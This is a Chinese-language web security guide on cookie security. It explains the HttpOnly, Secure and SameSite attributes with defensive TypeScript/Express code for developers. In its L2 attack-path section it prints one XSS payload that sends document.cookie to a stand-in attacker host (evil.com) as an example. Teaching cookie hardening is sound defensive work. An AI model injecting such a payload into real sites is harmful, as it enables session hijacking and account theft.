# Cookie 安全（Cookie Security）

## 元数据
- **tier适用**: L1 ✅ | L2 ✅ | L3 ✅
- **领域**: auth（认证安全）
- **严重程度**: high
- **修复成本**: L1: 免费 | L2: $0 | L3: 企业方案
- **独立开发者适用度**: ⭐⭐⭐⭐⭐ (5/5)
- **最后验证日期**: 2026-06-11

---

## L1 独立开发者版（速查版）

### 你会遭遇什么（一句话）
Cookie配置不当（缺少HttpOnly、Secure、SameSite属性），导致XSS窃取Cookie、中间人攻击、CSRF攻击等安全问题。

### 一分钟识别
你的产品是否有以下特征：
- [ ] 使用Cookie存储Session ID或认证Token
- [ ] Cookie未设置HttpOnly属性（可被JavaScript读取）
- [ ] Cookie未设置Secure属性（HTTP下明文传输）
- [ ] Cookie未设置SameSite属性（易受CSRF攻击）
- [ ] Cookie有效期过长（超过30天）
→ 勾选≥2项，即需立即关注此风险

### 一句话防御
为所有敏感Cookie设置HttpOnly + Secure + SameSite=Strict/Lax属性，有效期不超过7天。

### 快速行动清单
1. **立即行动**（今天可完成，免费）
   - [ ] 检查所有Cookie设置代码，添加HttpOnly、Secure、SameSite属性
   - [ ] 修改Session Cookie有效期为7天
   - [ ] 检查是否有Cookie存储敏感信息（如密码、Token）
   - [ ] 测试：尝试通过JavaScript读取Cookie（应失败）

2. **短期行动**（本周可完成，免费）
   - [ ] 实现Cookie加密（如使用iron-session）
   - [ ] 添加Cookie前缀（__Secure-、__Host-）
   - [ ] 实现Session轮换机制
   - [ ] 添加Cookie安全审计日志

3. **长期行动**（规划中，免费）
   - [ ] 升级到SameSite=None（需配合Secure）
   - [ ] 实现Cookie自动清理机制
   - [ ] 集成Cookie监控和告警

### 推荐工具
- **免费**：
  - [iron-session](https://github.com/vvo/iron-session) - Node.js加密Cookie
  - [cookie-parser](https://github.com/expressjs/cookie-parser) - Express Cookie解析
  - [NextAuth.js](https://next-auth.js.org/) - 内置安全Cookie管理

- **低成本**：
  - [Auth0](https://auth0.com/) - 托管Session管理
  - [Supabase Auth](https://supabase.com/auth) - 安全Cookie存储

### 验证方法
- [ ] 测试步骤1：打开浏览器开发者工具，尝试document.cookie读取（应失败）
- [ ] 测试步骤2：检查Cookie属性，确认HttpOnly、Secure、SameSite已设置
- [ ] 测试步骤3：使用HTTP访问，确认Cookie未发送
- [ ] 测试步骤4：从不同域名发起请求，确认Cookie未发送（SameSite生效）

---

## L2 小团队版（理解版）

### 场景还原
你的Web应用使用Cookie存储Session ID，某天发现异常：

**案例1：XSS窃取Cookie**
- Cookie未设置HttpOnly属性
- 攻击者通过XSS漏洞注入恶意脚本
- 脚本读取document.cookie并发送到攻击者服务器
- 攻击者使用Session ID劫持用户账号

**案例2：中间人攻击**
- Cookie未设置Secure属性
- 用户在公共WiFi下访问HTTP网站
- 攻击者通过中间人攻击窃取Cookie
- 使用Cookie访问用户账号

**案例3：CSRF攻击**
- Cookie未设置SameSite属性
- 攻击者构造恶意网站，诱导用户访问
- 恶意网站向你的应用发起请求
- 浏览器自动发送Cookie，请求成功执行

你的浏览器开发者工具显示：
```
Name: session_id
Value: abc123...
Domain: yourapp.com
Path: /
Expires: 2026-12-31 (有效期过长)
HttpOnly: ❌ (未设置)
Secure: ❌ (未设置)
SameSite: None (易受CSRF攻击)
```

### 攻击路径（简化版）

**路径1：XSS窃取Cookie**
1. 攻击者在评论区注入恶意脚本：`<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`
2. 用户访问包含恶意脚本的页面
3. 脚本执行，读取Cookie并发送到攻击者服务器
4. 攻击者获得Session ID
5. 使用Session ID访问用户账号

**路径2：中间人攻击**
1. 用户在公共WiFi下访问HTTP网站
2. Cookie未设置Secure，通过HTTP明文传输
3. 攻击者通过中间人攻击（如ARP欺骗）截获流量
4. 从流量中提取Cookie
5. 使用Cookie访问用户账号

**路径3：CSRF攻击**
1. 用户已登录你的网站，Cookie未设置SameSite
2. 攻击者构造恶意网站，包含表单提交到你的网站
3. 诱导用户访问恶意网站
4. 表单自动提交，浏览器发送Cookie
5. 你的服务器执行操作（如转账、修改密码）

### 防御实施（免费方案）

#### Cookie安全配置清单

```typescript
// lib/cookie-security.ts

/**
 * Cookie安全配置
 */
export const CookieSecurityConfig = {
  // ✅ 1. HttpOnly：防止XSS读取Cookie
  httpOnly: true,

  // ✅ 2. Secure：只在HTTPS下发送
  secure: process.env.NODE_ENV === 'production',

  // ✅ 3. SameSite：防止CSRF
  // - Strict：完全禁止跨站发送
  // - Lax：允许安全的跨站请求（GET链接）
  // - None：允许跨站发送（需配合Secure）
  sameSite: 'lax' as const,

  // ✅ 4. Path：限制Cookie作用范围
  path: '/',

  // ✅ 5. Domain：不设置（默认当前域名）
  // 不设置domain，防止子域名共享

  // ✅ 6. 有效期：合理设置
  maxAge: 7 * 24 * 60 * 60, // 7天

  // ✅ 7. 前缀：增强安全
  // __Secure-：要求Secure属性
  // __Host-：要求Secure + 不设置Domain + Path=/
}

/**
 * 安全Cookie管理类
 */
export class SecureCookie {
  /**
   * 设置安全Cookie
   */
  static set(
    name: string,
    value: string,
    options: Partial<typeof CookieSecurityConfig> = {}
  ): string {
    const config = { ...CookieSecurityConfig, ...options }

    // 构造Cookie字符串
    const parts: string[] = []

    // 名称和值
    parts.push(`${encodeURIComponent(name)}=${encodeURIComponent(value)}`)

    // HttpOnly
    if (config.httpOnly) {
      parts.push('HttpOnly')
    }

    // Secure
    if (config.secure) {
      parts.push('Secure')
    }

    // SameSite
    if (config.sameSite) {
      parts.push(`SameSite=${config.sameSite}`)
    }

    // Path
    if (config.path) {
      parts.push(`Path=${config.path}`)
    }

    // Domain（不设置更安全）
    if (config.domain) {
      parts.push(`Domain=${config.domain}`)
    }

    // 有效期
    if (config.maxAge) {
      parts.push(`Max-Age=${config.maxAge}`)
    } else if (config.expires) {
      parts.push(`Expires=${config.expires.toUTCString()}`)
    }

    return parts.join('; ')
  }

  /**
   * 删除Cookie
   */
  static delete(name: string): string {
    return `${encodeURIComponent(name)}=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0`
  }

  /**
   * 设置带前缀的安全Cookie
   */
  static setSecure(name: string, value: string, options = {}): string {
    // 添加__Secure-前缀
    const secureName = `__Secure-${name}`
    return this.set(secureName, value, { ...options, secure: true })
  }

  static setHost(name: string, value: string, options = {}): string {
    // 添加__Host-前缀
    const hostName = `__Host-${name}`
    return this.set(hostName, value, {
      ...options,
      secure: true,
      path: '/',
      // 不设置domain
    })
  }
}
```

#### Next.js API路由示例

```typescript
// app/api/auth/login/route.ts
import { NextRequest, NextResponse } from 'next/server'
import { SecureCookie } from '@/lib/cookie-security'
import { createSession } from '@/lib/session'

export async function POST(request: NextRequest) {
  try {
    const { email, password } = await request.json()

    // 验证用户
    const user = await authenticateUser(email, password)
    if (!user) {
      return NextResponse.json(
        { error: '邮箱或密码错误' },
        { status: 401 }
      )
    }

    // 创建Session
    const sessionToken = await createSession(user.id)

    // ✅ 设置安全Cookie
    const cookieHeader = SecureCookie.set('session_token', sessionToken, {
      maxAge: 7 * 24 * 60 * 60, // 7天
    })

    return NextResponse.json(
      { success: true, user },
      {
        headers: {
          'Set-Cookie': cookieHeader,
        },
      }
    )
  } catch (error) {
    console.error('Login error:', error)
    return NextResponse.json(
      { error: '登录失败' },
      { status: 500 }
    )
  }
}

// app/api/auth/logout/route.ts
export async function POST(request: NextRequest) {
  // ✅ 删除Cookie
  const cookieHeader = SecureCookie.delete('session_token')

  return NextResponse.json(
    { success: true },
    {
      headers: {
        'Set-Cookie': cookieHeader,
      },
    }
  )
}
```

#### 使用iron-session加密Cookie

```typescript
// lib/session.ts
import { getIronSession, SessionOptions } from 'iron-session'
import { NextApiRequest, NextApiResponse } from 'next'

interface SessionData {
  userId?: string
  email?: string
  role?: string
}

export const defaultSessionOptions: SessionOptions = {
  password: process.env.SESSION_SECRET!, // 至少32字符
  cookieName: 'app_session',
  cookieOptions: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    sameSite: 'lax' as const,
    path: '/',
    maxAge: 7 * 24 * 60 * 60, // 7天
  },
}

/**
 * 获取Session
 */
export async function getSession(
  req: NextApiRequest,
  res: NextApiResponse
): Promise<SessionData> {
  const session = await getIronSession<SessionData>(req, res, defaultSessionOptions)
  return session
}

/**
 * 创建Session
 */
export async function createSession(
  req: NextApiRequest,
  res: NextApiResponse,
  data: SessionData
): Promise<void> {
  const session = await getSession(req, res)

  // 设置Session数据
  Object.assign(session, data)

  // 保存Session
  await session.save()
}

/**
 * 销毁Session
 */
export async function destroySession(
  req: NextApiRequest,
  res: NextApiResponse
): Promise<void> {
  const session = await getSession(req, res)
  await session.destroy()
}
```

#### Session轮换机制

```typescript
// lib/session-rotation.ts
import { NextApiRequest, NextApiResponse } from 'next'
import { getSession, createSession } from './session'

/**
 * Session轮换（防止Session Fixation攻击）
 */
export async function rotateSession(
  req: NextApiRequest,
  res: NextApiResponse
): Promise<void> {
  // 获取当前Session
  const oldSession = await getSession(req, res)

  // 销毁旧Session
  await oldSession.destroy()

  // 创建新Session（保留数据）
  if (oldSession.userId) {
    await createSession(req, res, {
      userId: oldSession.userId,
      email: oldSession.email,
      role: oldSession.role,
    })
  }
}

/**
 * 在关键操作后轮换Session
 */
export async function afterCriticalAction(
  req: NextApiRequest,
  res: NextApiResponse
): Promise<void> {
  // 关键操作：登录、修改密码、修改邮箱、支付等
  await rotateSession(req, res)
}
```

#### Set-Cookie最佳实践

```typescript
// examples/cookie-examples.ts

/**
 * 不同场景的Cookie配置示例
 */

// 1. Session Cookie（最常用）
const sessionCookie = SecureCookie.set('session_id', 'abc123', {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 7 * 24 * 60 * 60, // 7天
  path: '/',
})

// 2. 记住我Cookie（长期）
const rememberMeCookie = SecureCookie.set('remember_token', 'xyz789', {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 30 * 24 * 60 * 60, // 30天
  path: '/',
})

// 3. CSRF Token Cookie（可被JS读取）
const csrfCookie = SecureCookie.set('csrf_token', 'token123', {
  httpOnly: false, // 允许JS读取
  secure: true,
  sameSite: 'strict',
  maxAge: 60 * 60, // 1小时
  path: '/',
})

// 4. 用户偏好Cookie（非敏感）
const themeCookie = SecureCookie.set('theme', 'dark', {
  httpOnly: false, // 允许JS读取
  secure: false, // 开发环境可用
  sameSite: 'lax',
  maxAge: 365 * 24 * 60 * 60, // 1年
  path: '/',
})

// 5. 使用__Secure-前缀（生产环境）
const secureCookie = SecureCookie.setSecure('auth_token', 'token123', {
  httpOnly: true,
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60,
})

// 6. 使用__Host-前缀（最严格）
const hostCookie = SecureCookie.setHost('session_id', 'abc123', {
  httpOnly: true,
  maxAge: 7 * 24 * 60 * 60,
})
```

---

### 决策树

```
你的Cookie是否包含敏感信息（Session ID、Token）？
├── 是 → 必须设置HttpOnly + Secure + SameSite
└── 否 →
    是否需要JavaScript读取？
    ├── 是 → 不设置HttpOnly，但仍需Secure + SameSite
    └── 否 → 设置HttpOnly + Secure + SameSite

你的应用是否使用HTTPS？
├── 是 → 必须设置Secure属性
└── 否 →
    是否在生产环境？
    ├── 是 → 立即启用HTTPS
    └── 否 → 开发环境可暂时不设置Secure

你的应用是否需要跨站请求？
├── 是 → 使用SameSite=None（必须配合Secure）
└── 否 → 使用SameSite=Strict或Lax
```

---

### 完整代码示例

**Express.js实现**

```typescript
// express-app.ts
import express from 'express'
import cookieParser from 'cookie-parser'
import session from 'express-session'

const app = express()

// Cookie解析中间件
app.use(cookieParser())

// Session中间件（安全配置）
app.use(
  session({
    name: 'sessionId', // 不要使用默认的connect.sid
    secret: process.env.SESSION_SECRET!,
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true, // ✅ 防止XSS
      secure: process.env.NODE_ENV === 'production', // ✅ 只在HTTPS下发送
      sameSite: 'strict', // ✅ 防止CSRF
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7天
      path: '/',
      // domain: 不设置，限制到当前域名
    },
  })
)

// 登录路由
app.post('/login', (req, res) => {
  const { email, password } = req.body

  // 验证用户
  const user = authenticateUser(email, password)
  if (!user) {
    return res.status(401).json({ error: '认证失败' })
  }

  // 设置Session
  req.session.userId = user.id
  req.session.email = user.email

  // ✅ Session轮换（防止Session Fixation）
  req.session.regenerate((err) => {
    if (err) {
      return res.status(500).json({ error: 'Session错误' })
    }

    req.session.userId = user.id
    req.session.email = user.email

    res.json({ success: true, user })
  })
})

// 登出路由
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: '登出失败' })
    }

    // 清除Cookie
    res.clearCookie('sessionId', {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      path: '/',
    })

    res.json({ success: true })
  })
})

// 设置自定义Cookie
app.get('/set-cookie', (req, res) => {
  // ✅ 安全设置Cookie
  res.cookie('user_preference', 'dark_mode', {
    httpOnly: false, // 允许JS读取
    secure: true,
    sameSite: 'lax',
    maxAge: 365 * 24 * 60 * 60 * 1000, // 1年
    path: '/',
  })

  res.json({ success: true })
})

// 认证中间件
function requireAuth(req: any, res: any, next: any) {
  if (!req.session.userId) {
    return res.status(401).json({ error: '未认证' })
  }
  next()
}

// 受保护的路由
app.get('/protected', requireAuth, (req, res) => {
  res.json({ message: '访问成功', userId: req.session.userId })
})

app.listen(3000, () => {
  console.log('Server running on port 3000')
})
```

---

## L3 企业版（深耕版）

企业级Cookie安全需要更完善的体系：

**1. 高级Cookie管理**
- Cookie加密和签名
- 多因素Cookie验证
- Cookie绑定设备指纹

**2. 完整Session管理**
- 分布式Session存储
- Session同步机制
- Session失效通知

**3. 监控和审计**
- Cookie使用分析
- 异常Cookie检测
- 安全事件审计

**详细内容请参考企业级案例**：
- [企业级Cookie安全](../../enterprise/bizsec/auth/cookie-security-enterprise.md)
- [Session管理最佳实践](../../enterprise/infosec/session-management.md)

---

## 成本估算总结

| 防护层级 | 月成本 | 实施时间 | 维护成本 | 适用场景 |
|---------|--------|---------|---------|---------|
| L1-基础配置 | $0 | 1小时 | 0.5小时/月 | MVP阶段 |
| L2-完整方案 | $0 | 4小时 | 1小时/月 | 生产环境 |
| L3-企业级 | $50+ | 需评估 | 专职团队 | 企业应用 |

---

## 常见问题

**Q: HttpOnly Cookie如何防止XSS？**
A: HttpOnly Cookie无法被JavaScript读取，即使存在XSS漏洞，攻击者也无法窃取Cookie。

**Q: SameSite=Lax和Strict有什么区别？**
A: Strict完全禁止跨站发送Cookie，Lax允许安全的跨站请求（如GET链接）。推荐使用Lax。

**Q: 开发环境没有HTTPS怎么办？**
A: 开发环境可以暂时不设置Secure，但生产环境必须启用HTTPS并设置Secure。

**Q: Cookie前缀（__Secure-、__Host-）有什么用？**
A: 前缀强制浏览器验证Cookie属性，防止配置错误导致的安全问题。

---

## 相关资源

**工具**
- [iron-session](https://github.com/vvo/iron-session) - 加密Cookie
- [cookie-parser](https://github.com/expressjs/cookie-parser) - Cookie解析
- [express-session](https://github.com/expressjs/session) - Session管理

**学习资源**
- [OWASP Cookie Security](https://owasp.org/www-community/controls/SecureCookieAttribute)
- [MDN HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [RFC 6265](https://tools.ietf.org/html/rfc6265)

**相关案例**
- [Session劫持](./session-hijacking.md)
- [CSRF攻击](./csrf-attack.md)
- [XSS攻击](../api/xss-attack.md)
